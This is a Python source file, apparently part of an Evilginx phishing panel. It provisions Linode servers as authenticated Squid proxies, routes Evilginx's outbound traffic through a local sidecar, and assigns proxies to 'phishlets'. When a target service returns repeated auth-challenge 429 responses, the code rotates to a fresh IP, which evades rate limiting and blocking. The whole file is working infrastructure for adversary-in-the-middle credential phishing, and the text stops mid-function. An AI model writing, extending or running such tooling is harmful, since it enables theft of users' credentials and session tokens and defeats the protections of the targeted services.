#!/usr/bin/env python3
"""Linode proxy fleet + local CONNECT sidecar for Evilginx outbound."""

import base64
import json
import os
import random
import re
import secrets
import socket
import string
import threading
import time
import urllib.error
import urllib.request

LINODE_API = "https://api.linode.com/v4"
SIDECAR_PORT = 18765
SQUID_PORT = 50100
HIT_WINDOW = 15 * 60
HIT_LIMIT = 3
TAG = "egx-panel-proxy"
IMAGE = "linode/ubuntu22.04"
PLAN = "g6-nanode-1"

_lock = threading.RLock()
_settings_path = None
_phishlets_dir = None
_egx_config_path = None
_notify = None  # fn(title, message, ntype)
_used_mem = {}
_used_dirty = False
_used_flushed = 0.0
_tunnels = []
_tunnels_lock = threading.Lock()


def init(settings_path, phishlets_dir, egx_config_path, notify_fn):
    global _settings_path, _phishlets_dir, _egx_config_path, _notify, _used_mem
    _settings_path = settings_path
    _phishlets_dir = phishlets_dir
    _egx_config_path = egx_config_path
    _notify = notify_fn
    try:
        _used_mem = dict((load().get("used_by") or {}))
    except Exception:
        _used_mem = {}


def _empty():
    return {
        "api_key": "",
        "proxies": [],
        "assignments": {},
        "current": {},
        "hits": {},
        "used_by": {},
        "deploy": {"running": False, "step": "", "pct": 0, "error": ""},
    }


def load():
    with _lock:
        if _settings_path and os.path.isfile(_settings_path):
            try:
                return json.load(open(_settings_path))
            except Exception:
                pass
        return _empty()


def save(s):
    with _lock:
        os.makedirs(os.path.dirname(_settings_path), exist_ok=True)
        tmp = _settings_path + ".tmp"
        with open(tmp, "w") as f:
            json.dump(s, f, indent=2)
        os.replace(tmp, _settings_path)


def _key(s=None):
    return (s or load()).get("api_key") or ""


def linode(method, path, body=None, key=None, timeout=40):
    token = key if key is not None else _key()
    if not token:
        raise RuntimeError("no linode api key")
    data = None if body is None else json.dumps(body).encode()
    req = urllib.request.Request(
        LINODE_API + path,
        data=data,
        method=method,
        headers={
            "Authorization": "Bearer " + token,
            "Content-Type": "application/json",
            "User-Agent": "evilginx-panel",
        },
    )
    try:
        with urllib.request.urlopen(req, timeout=timeout) as resp:
            raw = resp.read()
            return json.loads(raw.decode() or "{}")
    except urllib.error.HTTPError as e:
        err = e.read().decode("utf-8", "replace")[:500]
        raise RuntimeError(f"linode {e.code}: {err}") from e


def validate_key(key):
    try:
        linode("GET", "/profile", key=key.strip())
        return True, ""
    except Exception as e:
        return False, str(e)


_REGION_CONTINENT = {
    "us": "NORTH AMERICA", "ca": "NORTH AMERICA", "mx": "NORTH AMERICA",
    "de": "EUROPE", "gb": "EUROPE", "fr": "EUROPE", "nl": "EUROPE", "se": "EUROPE",
    "es": "EUROPE", "it": "EUROPE", "ie": "EUROPE", "fi": "EUROPE", "at": "EUROPE",
    "be": "EUROPE", "pl": "EUROPE", "ch": "EUROPE", "uk": "EUROPE",
    "sg": "ASIA PACIFIC", "jp": "ASIA PACIFIC", "au": "ASIA PACIFIC", "in": "ASIA PACIFIC",
    "id": "ASIA PACIFIC", "kr": "ASIA PACIFIC", "hk": "ASIA PACIFIC", "tw": "ASIA PACIFIC",
    "nz": "ASIA PACIFIC",
    "br": "SOUTH AMERICA", "cl": "SOUTH AMERICA", "ar": "SOUTH AMERICA",
    "za": "AFRICA", "ng": "AFRICA", "eg": "AFRICA",
    "il": "MIDDLE EAST", "ae": "MIDDLE EAST", "sa": "MIDDLE EAST",
}


def list_regions(key=None):
    data = linode("GET", "/regions", key=key)
    out = []
    for r in data.get("data") or []:
        caps = r.get("capabilities") or []
        if "Linodes" not in caps:
            continue
        cc = (r.get("country") or "").lower()
        city = r.get("label") or r.get("id") or ""
        out.append({
            "id": r.get("id"),
            "label": city,
            "country": cc,
            "city": city,
            "continent": _REGION_CONTINENT.get(cc, "OTHER"),
            "display": f"{cc.upper()}, {city} ({r.get('id')})",
        })
    order = ["NORTH AMERICA", "EUROPE", "ASIA PACIFIC", "SOUTH AMERICA", "AFRICA", "MIDDLE EAST", "OTHER"]
    out.sort(key=lambda x: (order.index(x["continent"]) if x["continent"] in order else 99, x["country"], x["label"]))
    return out


def public_ipv4():
    try:
        cfg = json.load(open(_egx_config_path))
        ip = (cfg.get("general") or {}).get("external_ipv4") or ""
        if ip:
            return ip
    except Exception:
        pass
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return ""


def _rand_user():
    return "px" + secrets.token_hex(3)


def _rand_pass():
    alphabet = string.ascii_letters + string.digits
    return "".join(secrets.choice(alphabet) for _ in range(18)) + "Aa1"


def _squid_install_script(user, password, allow_ip):
    return f"""#!/bin/bash
export DEBIAN_FRONTEND=noninteractive
wait_apt() {{
  for i in $(seq 1 90); do
    busy=0
    for lk in /var/lib/dpkg/lock /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock /var/cache/apt/archives/lock; do
      fuser "$lk" >/dev/null 2>&1 && busy=1
    done
    [ "$busy" = 0 ] && return 0
    sleep 4
  done
  return 0
}}
wait_apt
ok=0
for t in $(seq 1 8); do
  apt-get update -y && apt-get install -y squid apache2-utils ufw && ok=1 && break
  wait_apt
  sleep 5
done
[ "$ok" = 1 ] || {{ echo "apt install squid failed"; exit 1; }}
HELPER=""
for p in /usr/lib/squid/basic_ncsa_auth /usr/libexec/squid/basic_ncsa_auth /usr/lib/squid3/basic_ncsa_auth; do
  [ -x "$p" ] && HELPER="$p" && break
done
[ -n "$HELPER" ] || {{ echo "basic_ncsa_auth not found"; exit 1; }}
htpasswd -b -c /etc/squid/passwd {user} {password}
cat > /etc/squid/squid.conf << EOF
http_port {SQUID_PORT}
auth_param basic program $HELPER /etc/squid/passwd
auth_param basic realm proxy
auth_param basic credentialsttl 2 hours
acl authenticated proxy_auth REQUIRED
http_access allow authenticated
http_access deny all
cache deny all
forwarded_for off
via off
dns_v4_first on
EOF
systemctl restart squid
systemctl enable squid
ufw allow 22/tcp >/dev/null 2>&1 || true
ufw allow from {allow_ip} to any port {SQUID_PORT} proto tcp >/dev/null 2>&1 || true
ufw --force enable >/dev/null 2>&1 || true
ss -lnt | grep -q ':{SQUID_PORT}' || sleep 2
echo SQUID_READY
"""


def _cloud_init(user, password, allow_ip):
    script = _squid_install_script(user, password, allow_ip)
    b64 = base64.b64encode(script.encode()).decode()
    return (
        "#cloud-config\n"
        "package_update: false\n"
        "package_upgrade: false\n"
        "write_files:\n"
        "  - path: /root/install-squid.sh\n"
        "    encoding: b64\n"
        "    permissions: '0755'\n"
        f"    content: {b64}\n"
        "runcmd:\n"
        "  - bash /root/install-squid.sh\n"
    )


def _panel_pubkey():
    key_path = "/root/.ssh/id_ed25519"
    pub_path = key_path + ".pub"
    if not os.path.isfile(pub_path):
        os.makedirs("/root/.ssh", exist_ok=True)
        os.system(f'ssh-keygen -t ed25519 -N "" -f {key_path} >/dev/null 2>&1')
    try:
        return open(pub_path).read().strip()
    except Exception:
        return ""


def _ssh_run(ip, password, script, timeout=480):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    pkey = None
    try:
        pkey = paramiko.Ed25519Key.from_private_key_file("/root/.ssh/id_ed25519")
    except Exception:
        pkey = None
    last = None
    for _ in range(24):
        try:
            client.connect(
                ip, username="root", password=password or None, pkey=pkey,
                timeout=12, banner_timeout=25, auth_timeout=25,
                look_for_keys=False, allow_agent=False,
            )
            last = None
            break
        except Exception as e:
            last = e
            time.sleep(5)
    if last is not None:
        raise RuntimeError(f"ssh {ip}: {last}")
    try:
        stdin, stdout, stderr = client.exec_command(script, timeout=timeout)
        out = stdout.read().decode("utf-8", "replace")
        err = stderr.read().decode("utf-8", "replace")
        code = stdout.channel.recv_exit_status()
        return code, out, err
    finally:
        client.close()


def _wait_port(ip, port, timeout=240):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            s = socket.create_connection((ip, port), 6)
            s.close()
            return True
        except Exception:
            time.sleep(4)
    return False


_APT_IDLE_SH = r"""
export DEBIAN_FRONTEND=noninteractive
for i in $(seq 1 90); do
  busy=0
  pgrep -x apt-get >/dev/null 2>&1 && busy=1
  pgrep -x apt >/dev/null 2>&1 && busy=1
  pgrep -x dpkg >/dev/null 2>&1 && busy=1
  pgrep -x unattended-upgr >/dev/null 2>&1 && busy=1
  if command -v fuser >/dev/null 2>&1; then
    for lk in /var/lib/dpkg/lock /var/lib/dpkg/lock-frontend /var/lib/apt/lists/lock /var/cache/apt/archives/lock; do
      fuser "$lk" >/dev/null 2>&1 && busy=1
    done
  fi
  [ "$busy" = 0 ] && break
  sleep 4
done
echo APT_IDLE
"""

_CLOUD_STATUS_SH = "cloud-init status 2>/dev/null || echo 'status: unknown'"


def _wait_guest_ready(ip, root_pass, timeout=540, on_tick=None):
    """SSH up, cloud-init finished, apt idle, then extra 5s settle."""
    if not ip:
        return False, "no ipv4"
    if not _wait_port(ip, 22, min(240, timeout)):
        return False, "ssh port never opened"
    t0 = time.time()
    while time.time() - t0 < timeout:
        elapsed = int(time.time() - t0)
        if on_tick:
            on_tick(elapsed, "cloud-init")
        try:
            _code, out, _err = _ssh_run(ip, root_pass, _CLOUD_STATUS_SH, timeout=30)
        except Exception:
            time.sleep(6)
            continue
        low = (out or "").lower()
        if "status: done" in low or "status: disabled" in low or "status: error" in low:
            break
        time.sleep(6)
    if on_tick:
        on_tick(int(time.time() - t0), "apt")
    try:
        _ssh_run(ip, root_pass, _APT_IDLE_SH, timeout=360)
    except Exception:
        pass
    if on_tick:
        on_tick(int(time.time() - t0), "settle")
    time.sleep(5)
    return True, ""


def _install_squid(ip, root_pass, user, password, allow_ip):
    if not _wait_port(ip, 22, 240):
        return False, "ssh port never opened"
    script = _squid_install_script(user, password, allow_ip)
    try:
        code, out, err = _ssh_run(ip, root_pass, script, timeout=540)
    except Exception as e:
        return False, str(e)
    if code != 0:
        return False, (err or out or f"exit {code}")[-400:]
    ok = _squid_up(ip, user, password, timeout=90)
    return ok, ("" if ok else "squid installed but port 50100 not answering")


def domain_to_phishlet(host):
    host = (host or "").split(":")[0].lower().lstrip(".")
    if not _phishlets_dir or not os.path.isdir(_phishlets_dir):
        return ""
    for fn in os.listdir(_phishlets_dir):
        if not fn.endswith((".yaml", ".yml")):
            continue
        try:
            txt = open(os.path.join(_phishlets_dir, fn), encoding="utf-8", errors="replace").read()
        except Exception:
            continue
        for m in re.finditer(r"domain:\s*['\"]([^'\"]+)['\"]", txt):
            d = m.group(1).lower()
            if host == d or host.endswith("." + d):
                return os.path.splitext(fn)[0]
    return ""


def _as_id(x):
    try:
        return int(x)
    except Exception:
        return x


def _track_tunnel(px_id, *socks):
    rec = {"px_id": _as_id(px_id) if px_id is not None else None, "socks": socks}
    with _tunnels_lock:
        _tunnels.append(rec)
    return rec


def _untrack_tunnel(rec):
    if not rec:
        return
    with _tunnels_lock:
        try:
            _tunnels.remove(rec)
        except ValueError:
            pass


def drop_proxy_tunnels(linode_ids):
    """Force-close live sidecar CONNECT tunnels for these Linode ids.

    Evilginx reuses idle upstreams. Detach only updated JSON before; the
    Squid hop stayed up until idle timeout, so refresh still used the old IP.
    """
    drop = {_as_id(i) for i in (linode_ids or []) if i is not None}
    if not drop:
        return 0
    doomed = []
    with _tunnels_lock:
        keep = []
        for rec in _tunnels:
            if rec.get("px_id") in drop:
                doomed.append(rec)
            else:
                keep.append(rec)
        _tunnels[:] = keep
    for rec in doomed:
        for s in rec.get("socks") or []:
            if s is None:
                continue
            try:
                s.shutdown(socket.SHUT_RDWR)
            except Exception:
                pass
            try:
                s.close()
            except Exception:
                pass
    return len(doomed)


def pick_proxy(origin_host):
    s = load()
    pl = domain_to_phishlet(origin_host)
    ids = [_as_id(i) for i in (s.get("assignments") or {}).get(pl) or []]
    live = [p for p in s.get("proxies") or [] if _as_id(p.get("id")) in ids and p.get("status") == "active" and p.get("ipv4")]
    if not live:
        return None
    cur = _as_id((s.get("current") or {}).get(pl))
    chosen = None
    for p in live:
        if _as_id(p.get("id")) == cur:
            chosen = p
            break
    if chosen is None:
        s.setdefault("current", {})[pl] = live[0]["id"]
        save(s)
        chosen = live[0]
    if pl:
        _note_use(chosen.get("id"), pl)
    return chosen


def _used_slot(px_id, phishlet):
    rec = _used_mem.setdefault(str(_as_id(px_id)), {})
    slot = rec.setdefault(phishlet, {"hits": 0, "last": 0, "bytes_out": 0, "bytes_in": 0})
    slot.setdefault("hits", 0)
    slot.setdefault("last", 0)
    slot.setdefault("bytes_out", 0)
    slot.setdefault("bytes_in", 0)
    return slot


def _flush_used(force=False):
    global _used_dirty, _used_flushed
    if not _used_dirty:
        return
    now = time.time()
    if not force and now - _used_flushed < 5:
        return
    with _lock:
        s = load()
        s["used_by"] = json.loads(json.dumps(_used_mem))
        save(s)
        _used_flushed = now
        _used_dirty = False


def _note_use(px_id, phishlet):
    global _used_dirty
    if not px_id or not phishlet:
        return
    with _lock:
        slot = _used_slot(px_id, phishlet)
        slot["hits"] = int(slot.get("hits") or 0) + 1
        slot["last"] = int(time.time())
        _used_dirty = True
        _flush_used()


def _add_bytes(px_id, phishlet, n_out=0, n_in=0):
    global _used_dirty
    if not px_id or not phishlet:
        return
    n_out = int(n_out or 0)
    n_in = int(n_in or 0)
    if n_out <= 0 and n_in <= 0:
        return
    with _lock:
        slot = _used_slot(px_id, phishlet)
        slot["bytes_out"] = int(slot.get("bytes_out") or 0) + n_out
        slot["bytes_in"] = int(slot.get("bytes_in") or 0) + n_in
        slot["last"] = int(time.time())
        _used_dirty = True
        _flush_used()


def record_auth_429(phishlet, host="", path=""):
    """Count only auth-challenge 429s. Never destroys a Linode. Never detaches a proxy that is not live."""
    with _lock:
        s = load()
        pl = phishlet or domain_to_phishlet(host)
        if not pl:
            return {"ok": True, "ignored": True}
        px_id = _as_id((s.get("current") or {}).get(pl))
        rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == px_id), None)
        if not rec or rec.get("status") != "active":
            return {"ok": True, "ignored": True, "reason": "current proxy not live"}
        now = time.time()
        key = f"{pl}:{px_id}"
        hits = [t for t in (s.get("hits") or {}).get(key, []) if now - t < HIT_WINDOW]
        hits.append(now)
        s.setdefault("hits", {})[key] = hits
        save(s)
        if len(hits) < HIT_LIMIT:
            return {"ok": True, "hits": len(hits), "limit": HIT_LIMIT}

        assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(pl) or []]
        if px_id in assigned:
            assigned.remove(px_id)
        s.setdefault("assignments", {})[pl] = assigned
        nxt = assigned[0] if assigned else None
        s.setdefault("current", {})[pl] = nxt
        s["hits"][key] = []
        save(s)
        drop_proxy_tunnels([px_id])

        dead = rec
        ip = (dead or {}).get("ipv4") or str(px_id)
        if _notify:
            if nxt:
                nxtp = next((p for p in s["proxies"] if _as_id(p.get("id")) == nxt), None)
                _notify(
                    "Proxy rotated",
                    f"Phishlet {pl}: {ip} hit {HIT_LIMIT} auth-429 in {HIT_WINDOW//60}m. Detached (instance kept). Now using {(nxtp or {}).get('ipv4') or nxt}.",
                    "warning",
                )
            else:
                _notify(
                    "Proxy pool empty",
                    f"Phishlet {pl}: all assigned proxies exhausted. Traffic uses the Evilginx server IP.",
                    "error",
                )
        return {"ok": True, "rotated": True, "detached": px_id, "next": nxt}


def ensure_evilginx_sidecar_proxy():
    """Point Evilginx built-in proxy at local sidecar. Caller restarts evilginx."""
    if not _egx_config_path or not os.path.isfile(_egx_config_path):
        return
    try:
        cfg = json.load(open(_egx_config_path))
    except Exception:
        return
    cfg["proxy"] = {
        "type": "http",
        "address": "127.0.0.1",
        "port": SIDECAR_PORT,
        "username": "",
        "password": "",
        "enabled": True,
    }
    with open(_egx_config_path, "w") as f:
        json.dump(cfg, f, indent=2)


def public_state():
    s = load()
    assigned_rev = {}
    for pl, ids in (s.get("assignments") or {}).items():
        for i in ids or []:
            assigned_rev.setdefault(_as_id(i), []).append(pl)
    proxies = []
    for p in s.get("proxies") or []:
        q = dict(p)
        q.pop("squid_pass", None)
        q.pop("root_pass", None)
        q["squid_user"] = p.get("squid_user") or ""
        q["endpoint"] = f"{p.get('ipv4')}:{SQUID_PORT}" if p.get("ipv4") else ""
        q["ready"] = p.get("status") == "active"
        pid = _as_id(p.get("id"))
        q["id"] = pid
        q["assigned_phishlets"] = list(assigned_rev.get(pid) or [])
        used = (
            _used_mem.get(str(pid))
            or _used_mem.get(str(p.get("id")))
            or (s.get("used_by") or {}).get(str(pid))
            or (s.get("used_by") or {}).get(str(p.get("id")))
            or {}
        )
        q["used_by"] = used
        proxies.append(q)
    return {
        "configured": bool(s.get("api_key")),
        "proxies": proxies,
        "assignments": s.get("assignments") or {},
        "current": s.get("current") or {},
        "deploy": s.get("deploy") or {},
        "allow_ip": public_ipv4(),
        "plan": PLAN,
        "image": IMAGE,
    }


def assign(phishlet, linode_ids):
    with _lock:
        s = load()
        ids = []
        known = {_as_id(p.get("id")) for p in s.get("proxies") or []}
        for i in linode_ids:
            i = _as_id(i)
            if i in known:
                ids.append(i)
        s.setdefault("assignments", {})[phishlet] = ids
        if ids:
            cur = _as_id((s.get("current") or {}).get(phishlet))
            if cur not in ids:
                s.setdefault("current", {})[phishlet] = ids[0]
        else:
            s.setdefault("current", {})[phishlet] = None
        save(s)
    ensure_evilginx_sidecar_proxy()
    return public_state()


def detach(phishlet, linode_ids):
    with _lock:
        s = load()
        drop = set()
        for i in linode_ids or []:
            drop.add(_as_id(i))
        assigned = [_as_id(i) for i in (s.get("assignments") or {}).get(phishlet) or [] if _as_id(i) not in drop]
        s.setdefault("assignments", {})[phishlet] = assigned
        cur = _as_id((s.get("current") or {}).get(phishlet))
        if cur in drop or cur not in assigned:
            s.setdefault("current", {})[phishlet] = assigned[0] if assigned else None
        save(s)
    # Kill live CONNECT tunnels through the detached Squid(s). Otherwise Evilginx
    # keeps the idle upstream and refresh still exits via the old proxy IP.
    drop_proxy_tunnels(drop)
    return public_state()


def destroy_instance(linode_id):
    """User-clicked destroy only. Never called from deploy/health checks."""
    s = load()
    linode_id = int(linode_id)
    tagged = False
    for p in s.get("proxies") or []:
        if p.get("id") == linode_id:
            tagged = True
            break
    if not tagged:
        raise RuntimeError("refusing to delete: instance is not a panel proxy")
    linode("DELETE", f"/linode/instances/{linode_id}")
    s["proxies"] = [p for p in s.get("proxies") or [] if p.get("id") != linode_id]
    for pl, ids in list((s.get("assignments") or {}).items()):
        s["assignments"][pl] = [i for i in ids if i != linode_id]
        if (s.get("current") or {}).get(pl) == linode_id:
            s["current"][pl] = (s["assignments"][pl][0] if s["assignments"][pl] else None)
    save(s)
    drop_proxy_tunnels([linode_id])
    if _notify:
        _notify("Proxy destroyed", f"Linode {linode_id} deleted by user.", "info")
    return public_state()


def _known_proxy(linode_id):
    lid = int(linode_id)
    rec = next((p for p in (load().get("proxies") or []) if p.get("id") == lid), None)
    if not rec:
        raise RuntimeError("instance is not a panel proxy")
    return rec


def power_instance(linode_id, action):
    """Start / stop / restart a panel proxy Linode. Never deletes it."""
    rec = _known_proxy(linode_id)
    lid = rec["id"]
    action = (action or "").strip().lower()
    if action not in ("start", "stop", "restart"):
        raise RuntimeError("action must be start, stop or restart")
    label = rec.get("label") or f"proxy-{lid}"

    def _ok_already(err):
        msg = str(err).lower()
        return any(x in msg for x in ("already running", "already offline", "linode is not running", "busy"))

    try:
        if action == "start":
            try:
                linode("POST", f"/linode/instances/{lid}/boot")
            except RuntimeError as e:
                if not _ok_already(e):
                    raise
            _patch_proxy(lid, status="booting")
        elif action == "stop":
            try:
                linode("POST", f"/linode/instances/{lid}/shutdown")
            except RuntimeError as e:
                if not _ok_already(e):
                    raise
            _patch_proxy(lid, status="stopped")
        else:
            try:
                linode("POST", f"/linode/instances/{lid}/reboot")
            except RuntimeError as e:
                if "not running" in str(e).lower() or "offline" in str(e).lower():
                    linode("POST", f"/linode/instances/{lid}/boot")
                elif not _ok_already(e):
                    raise
            _patch_proxy(lid, status="rebooting")
    except RuntimeError:
        raise

    if _notify:
        titles = {"start": "Proxy start", "stop": "Proxy stop", "restart": "Proxy restart"}
        msgs = {
            "start": f"{label} booting.",
            "stop": f"{label} shutting down. Traffic skips this node until Start.",
            "restart": f"{label} rebooting.",
        }
        ntype = "warning" if action == "stop" else "progress"
        _notify(titles[action], msgs[action], ntype)

    threading.Thread(target=_power_followup, args=(lid, action, label), daemon=True).start()
    return public_state()


def _power_followup(lid, action, label):
    try:
        if action == "stop":
            _wait_status(lid, "offline", 180)
            _patch_proxy(lid, status="stopped")
            if _notify:
                _notify("Proxy stopped", f"{label} is offline.", "info")
            return
        info = _wait_running(lid, 300)
        ipv4 = (info.get("ipv4") or [None])[0]
        kw = {"status": "active" if info.get("status") == "running" else (info.get("status") or "unknown")}
        if ipv4:
            kw["ipv4"] = ipv4
        _patch_proxy(lid, **kw)
        if _notify:
            _notify("Proxy " + action, f"{label} is running.", "success")
    except Exception as e:
        if _notify:
            _notify("Proxy power error", f"{label}: {e}", "error")


def instance_metrics(linode_id, with_stats=True):
    try:
        st = linode("GET", f"/linode/instances/{linode_id}")
        stats = {}
        if with_stats:
            try:
                stats = linode("GET", f"/linode/instances/{linode_id}/stats")
            except Exception:
                stats = {}
        cpu = 0
        net_in = 0
        net_out = 0
        data = (stats.get("data") or stats)
        if isinstance(data.get("cpu"), list) and data["cpu"]:
            last = data["cpu"][-1]
            cpu = last[1] if isinstance(last, list) and len(last) > 1 else 0
        nv = data.get("netv4") or {}
        if isinstance(nv.get("in"), list) and nv["in"]:
            last = nv["in"][-1]
            net_in = last[1] if isinstance(last, list) and len(last) > 1 else 0
        if isinstance(nv.get("out"), list) and nv["out"]:
            last = nv["out"][-1]
            net_out = last[1] if isinstance(last, list) and len(last) > 1 else 0
        ipv4 = st.get("ipv4") or []
        return {
            "id": linode_id,
            "linode_status": st.get("status"),
            "label": st.get("label"),
            "region": st.get("region"),
            "ipv4": ipv4[0] if ipv4 else "",
            "cpu": round(float(cpu or 0), 1),
            "net_in": net_in,
            "net_out": net_out,
            "type": st.get("type"),
        }
    except Exception as e:
        return {"id": linode_id, "error": str(e)}


def _set_deploy(s, **kw):
    d = s.setdefault("deploy", {})
    d.update(kw)
    save(s)


def deploy_async(count, regions, restart_egx):
    t = threading.Thread(target=_deploy_worker, args=(int(count), list(regions), restart_egx), daemon=True)
    t.start()


def _wait_running(lid, timeout=240):
    t0 = time.time()
    while time.time() - t0 < timeout:
        info = linode("GET", f"/linode/instances/{lid}")
        if info.get("status") == "running" and info.get("ipv4"):
            return info
        time.sleep(5)
    return linode("GET", f"/linode/instances/{lid}")


def _squid_up(ip, user, password, timeout=180):
    t0 = time.time()
    token = base64.b64encode(f"{user}:{password}".encode()).decode()
    while time.time() - t0 < timeout:
        try:
            s = socket.create_connection((ip, SQUID_PORT), 8)
            s.sendall(
                f"CONNECT example.com:443 HTTP/1.1\r\nHost: example.com:443\r\nProxy-Authorization: Basic {token}\r\n\r\n".encode()
            )
            s.settimeout(8)
            buf = s.recv(256)
            s.close()
            if buf.startswith(b"HTTP/1.") and b" 407" not in buf[:40]:
                return True
        except Exception:
            time.sleep(6)
    return False


def _patch_proxy(lid, **kw):
    lid = _as_id(lid)
    with _lock:
        s = load()
        for p in s.get("proxies") or []:
            if _as_id(p.get("id")) == lid:
                p.update(kw)
                break
        save(s)


def _wait_status(lid, want, timeout=180):
    t0 = time.time()
    info = {}
    while time.time() - t0 < timeout:
        info = linode("GET", f"/linode/instances/{lid}")
        if info.get("status") == want:
            return info
        time.sleep(4)
    return info


def _finish_one(rec, allow_ip, report=None):
    lid = rec["id"]
    label = rec.get("label") or str(lid)
    root = rec.get("root_pass") or ""
    user, pw = rec.get("squid_user"), rec.get("squid_pass")

    def go(pct, msg):
        if report:
            report(lid, pct, msg)

    go(8, f"{label}: waiting Linode running")
    info = _wait_running(lid, timeout=360)
    ipv4 = (info.get("ipv4") or [rec.get("ipv4")])[0]
    _patch_proxy(lid, ipv4=ipv4, status="installing")
    if not ipv4:
        _patch_proxy(lid, status="failed")
        return False, "no ipv4 after boot"

    go(18, f"{label}: waiting SSH")

    def on_tick(elapsed, phase):
        if phase == "cloud-init":
            go(22 + min(40, elapsed // 8), f"{label}: cloud-init {elapsed}s")
        elif phase == "apt":
            go(64, f"{label}: waiting apt idle")
        else:
            go(70, f"{label}: settle 5s")

    ok_boot, err_boot = _wait_guest_ready(ipv4, root, timeout=540, on_tick=on_tick)
    if not ok_boot:
        _patch_proxy(lid, status="failed")
        return False, err_boot

    go(74, f"{label}: checking squid")
    if user and pw and _squid_up(ipv4, user, pw, timeout=25):
        go(100, f"{label}: squid ready")
        _patch_proxy(lid, status="active")
        return True, ""

    go(80, f"{label}: installing squid")
    ok, err = _install_squid(ipv4, root, user, pw, allow_ip)
    go(100 if ok else 90, f"{label}: squid {'ready' if ok else 'failed'}")
    _patch_proxy(lid, status="active" if ok else "failed")
    return ok, err


def _deploy_worker(count, regions, restart_egx):
    s = load()
    if s.get("deploy", {}).get("running"):
        return
    if count < 1:
        _set_deploy(s, running=False, error="count must be >= 1", pct=0)
        return
    if not regions:
        _set_deploy(s, running=False, error="pick at least one region", pct=0)
        return
    if len(regions) > count:
        _set_deploy(s, running=False, error="regions cannot exceed server count", pct=0)
        return
    allow_ip = public_ipv4()
    if not allow_ip:
        _set_deploy(s, running=False, error="cannot detect Evilginx public IP", pct=0)
        return
    _set_deploy(s, running=True, error="", pct=2, step="creating all servers")
    if _notify:
        _notify("Proxy deploy started", f"Creating {count} Nanode 1GB in parallel ({', '.join(regions)}).", "progress")
    recs = []
    try:
        pubkey = _panel_pubkey()
        for i in range(count):
            region = regions[i % len(regions)]
            user, pw = _rand_user(), _rand_pass()
            root = _rand_pass()
            label = "egx-px-" + secrets.token_hex(3)
            body = {
                "type": PLAN,
                "region": region,
                "image": IMAGE,
                "label": label,
                "root_pass": root,
                "tags": [TAG],
                "booted": True,
                "authorized_keys": [pubkey] if pubkey else None,
                "metadata": {"user_data": base64.b64encode(_cloud_init(user, pw, allow_ip).encode()).decode()},
            }
            if not body["authorized_keys"]:
                body.pop("authorized_keys")
            inst = linode("POST", "/linode/instances", body)
            lid = inst.get("id")
            rec = {
                "id": lid,
                "label": label,
                "region": region,
                "ipv4": (inst.get("ipv4") or [None])[0] or "",
                "squid_user": user,
                "squid_pass": pw,
                "root_pass": root,
                "port": SQUID_PORT,
                "status": "provisioning",
                "created": int(time.time()),
            }
            s = load()
            s.setdefault("proxies", []).append(rec)
            save(s)
            recs.append(rec)
            _set_deploy(load(), running=True, pct=int(4 + (i + 1) / count * 16), step=f"created {i+1}/{count} {label}", error="")
        _set_deploy(load(), running=True, pct=22, step=f"boot + cloud-init + squid on {len(recs)} server(s)", error="")
        results = [None] * len(recs)
        prog = {}
        plock = threading.Lock()
        n = max(1, len(recs))

        def _report(lid, pct, msg):
            with plock:
                prog[lid] = max(0, min(100, int(pct)))
                avg = sum(prog.get(r["id"], 0) for r in recs) / n
                overall = 22 + int(avg * 0.76)
                _set_deploy(load(), running=True, pct=min(98, overall), step=msg, error="")

        def _job(idx, rec):
            results[idx] = _finish_one(rec, allow_ip, report=_report)

        threads = [threading.Thread(target=_job, args=(i, rec), daemon=True) for i, rec in enumerate(recs)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()
        failed = 0
        for rec, res in zip(recs, results):
            ok, err = res if res else (False, "no result")
            if not ok:
                failed += 1
                if _notify:
                    _notify("Proxy install failed", f"{rec.get('label')} ({rec.get('ipv4')}): {err}. Instance was NOT deleted — use Repair or Destroy.", "warning")
        ensure_evilginx_sidecar_proxy()
        if restart_egx:
            try:
                restart_egx()
            except Exception:
                pass
        _set_deploy(load(), running=False, pct=100, step="done", error="")
        if _notify:
            _notify("Proxy deploy finished", f"{len(recs)} instance(s) created, {failed} squid-failed (kept). Assign only Active ones.", "success")
    except Exception as e:
        _set_deploy(load(), running=False, pct=0, step="error", error=str(e))
        if _notify:
            _notify("Proxy deploy error", str(e), "error")


def _repair_install(rec, ip, root, allow_ip):
    user, pw = rec.get("squid_user"), rec.get("squid_pass")
    ok_boot, err_boot = _wait_guest_ready(ip, root, timeout=540)
    if not ok_boot:
        return False, err_boot
    if user and pw and _squid_up(ip, user, pw, timeout=25):
        return True, ""
    return _install_squid(ip, root, user, pw, allow_ip)


def repair_instance(linode_id):
    """Install squid on an existing Nanode. Never deletes it. May reboot if SSH key/password is missing."""
    s = load()
    rec = next((p for p in s.get("proxies") or [] if _as_id(p.get("id")) == _as_id(linode_id)), None)
    if not rec:
        raise RuntimeError("instance is not a panel proxy")
    allow_ip = public_ipv4()
    lid = rec["id"]
    ip = rec.get("ipv4") or ""
    label = rec.get("label") or str(lid)
    _patch_proxy(lid, status="installing")
    if rec.get("squid_user") and rec.get("squid_pass") and ip and _squid_up(ip, rec["squid_user"], rec["squid_pass"], timeout=8):
        _patch_proxy(lid, status="active")
        return public_state()
    root = rec.get("root_pass") or ""
    if ip and root:
        ok, err = _repair_install(rec, ip, root, allow_ip)
        if ok:
            _patch_proxy(lid, status="active")
            if _notify:
                _notify("Proxy repaired", f"{label} ({ip}) squid is up.", "success")
            return public_state()
    if _notify:
        _notify("Proxy repair reboot", f"{label}: resetting SSH access (power cycle, instance kept) then installing squid.", "progress")
    linode("POST", f"/linode/instances/{lid}/shutdown")
    _wait_status(lid, "offline", 180)
    root = _rand_pass()
    linode("POST", f"/linode/instances/{lid}/password", {"root_pass": root})
    _patch_proxy(lid, root_pass=root)
    linode("POST", f"/linode/instances/{lid}/boot")
    info = _wait_running(lid, 360)
    ip = (info.get("ipv4") or [ip])[0]
    _patch_proxy(lid, ipv4=ip, root_pass=root, status="installing")
    ok, err = _repair_install(rec, ip, root, allow_ip)
    _patch_proxy(lid, status="active" if ok else "failed")
    if _notify:
        if ok:
